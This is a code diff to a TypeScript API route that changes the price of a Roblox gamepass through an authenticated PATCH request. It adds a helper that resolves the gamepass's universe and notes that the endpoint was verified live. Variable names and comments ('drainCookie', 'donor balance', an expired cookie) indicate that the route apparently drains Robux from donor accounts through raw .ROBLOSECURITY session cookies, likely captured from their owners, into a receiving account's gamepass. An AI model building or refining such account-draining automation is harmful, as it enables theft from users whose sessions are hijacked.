@@ -63,63 +63,64 @@ async function getCsrf(cookie: string): Promise<string | null> {
   return r?.headers.get("x-csrf-token") ?? null;
 }
 
+/** Resolve the universe a gamepass belongs to (needed for the price-change endpoint).
+ *  gamepass → placeId (GET .../game-passes/{id}/details) → universeId. */
+async function resolveUniverse(cookie: string, gpId: string): Promise<number | null> {
+  let placeId: number | undefined;
+  try {
+    const r = await fetch(`https://apis.roblox.com/game-passes/v1/game-passes/${gpId}/details`, {
+      headers: { ...ROBLOX_UA, Cookie: `.ROBLOSECURITY=${cookie}` },
+      signal: AbortSignal.timeout(10_000),
+    });
+    if (r.ok) placeId = (await r.json())?.placeId;
+  } catch { /* fall through */ }
+  if (!placeId) return null;
+
+  try {
+    const r = await fetch(`https://apis.roblox.com/universes/v1/places/${placeId}/universe`, {
+      headers: ROBLOX_UA, signal: AbortSignal.timeout(10_000),
+    });
+    if (r.ok) return (await r.json())?.universeId ?? null;
+  } catch { /* fall through */ }
+  return null;
+}
+
 /**
- * SPIKE — change a gamepass price. Roblox has moved this endpoint over the
- * years, so we try the modern game-passes API first, then fall back to the
- * legacy web endpoint. Whichever returns 2xx wins. VERIFY against a live
- * gamepass once drainCookie is set, then prune the losing branch.
+ * Change a gamepass price. VERIFIED live 2026-07-03 against a real gamepass:
+ *   PATCH apis.roblox.com/game-passes/v1/universes/{universeId}/game-passes/{gpId}
+ *   multipart/form-data, capitalized fields `IsForSale` + `Price`, X-CSRF-TOKEN header → 204.
+ * Gotchas learned the hard way:
+ *   • The write is universe-scoped — you must resolve universeId first.
+ *   • It MUST be multipart/form-data. JSON / merge-patch / json-patch all → 415.
+ *   • Do NOT set Content-Type manually; fetch derives the multipart boundary.
+ *   • The old POST .../game-passes/{id}/details path is dead (GET-only now → 404 on write).
  */
 async function setGamepassPrice(
-  cookie: string, csrf: string, gpId: string, price: number, info: any,
+  cookie: string, csrf: string, gpId: string, price: number,
 ): Promise<{ ok: boolean; via: string; detail: string }> {
-  const name = info?.Name ?? "Gamepass";
-  const description = info?.Description ?? "";
+  const universeId = await resolveUniverse(cookie, gpId);
+  if (!universeId) return { ok: false, via: "none", detail: "universeId геймпасса не получен" };
 
-  // Attempt A — modern game-passes API
-  let aStatus = 0, aBody = "";
+  const fd = new FormData();
+  fd.append("IsForSale", String(price > 0));
+  fd.append("Price", String(Math.floor(price)));
+
+  let status = 0, body = "";
   try {
-    const rA = await fetch(`https://apis.roblox.com/game-passes/v1/game-passes/${gpId}/details`, {
-      method: "POST",
-      headers: {
-        Cookie: `.ROBLOSECURITY=${cookie}`,
-        "Content-Type": "application/json",
-        "x-csrf-token": csrf,
-      },
-      body: JSON.stringify({ name, description, price, isForSale: true }),
+    const r = await fetch(`https://apis.roblox.com/game-passes/v1/universes/${universeId}/game-passes/${gpId}`, {
+      method: "PATCH",
+      headers: { Cookie: `.ROBLOSECURITY=${cookie}`, "X-CSRF-TOKEN": csrf },
+      body: fd,
       signal: AbortSignal.timeout(12_000),
     });
-    aStatus = rA.status;
-    aBody = (await rA.text().catch(() => "")).slice(0, 200);
-    if (rA.ok) return { ok: true, via: "apis/details", detail: `${aStatus}` };
+    status = r.status;
+    body = (await r.text().catch(() => "")).slice(0, 200);
+    if (r.ok) return { ok: true, via: "universes-patch", detail: `${status}` };
   } catch (e: any) {
-    aBody = String(e?.message ?? e).slice(0, 120);
+    body = String(e?.message ?? e).slice(0, 120);
   }
 
-  // Attempt B — legacy web endpoint (form-encoded)
-  let bStatus = 0, bBody = "";
-  try {
-    const params = new URLSearchParams({
-      id: gpId, name, description,
-      price: String(price), isForSale: "true", sellForRobux: "true",
-    });
-    const rB = await fetch("https://www.roblox.com/game-pass/update", {
-      method: "POST",
-      headers: {
-        Cookie: `.ROBLOSECURITY=${cookie}`,
-        "Content-Type": "application/x-www-form-urlencoded",
-        "X-CSRF-TOKEN": csrf,
-      },
-      body: params.toString(),
-      signal: AbortSignal.timeout(12_000),
-    });
-    bStatus = rB.status;
-    bBody = (await rB.text().catch(() => "")).slice(0, 200);
-    if (rB.ok) return { ok: true, via: "web/update", detail: `${bStatus}` };
-  } catch (e: any) {
-    bBody = String(e?.message ?? e).slice(0, 120);
-  }
-
-  return { ok: false, via: "none", detail: `A[${aStatus}]:${aBody} B[${bStatus}]:${bBody}` };
+  return { ok: false, via: "none", detail: `[${status}] ${body}` };
 }
 
 // ── GET — drain account + donor balance + gamepass snapshot ─────────────────
@@ -251,7 +252,7 @@ export async function POST(req: NextRequest) {
     const drainCsrf = await getCsrf(drainCookie);
     if (!drainCsrf) return NextResponse.json({ error: "CSRF приёмника не получен — cookie протух?" }, { status: 502 });
 
-    const priceRes = await setGamepassPrice(drainCookie, drainCsrf, gpId, target, info);
+    const priceRes = await setGamepassPrice(drainCookie, drainCsrf, gpId, target);
     if (!priceRes.ok)
       return NextResponse.json({ ok: true, success: false, msg: `Не удалось сменить цену геймпасса (${priceRes.detail})` });
 
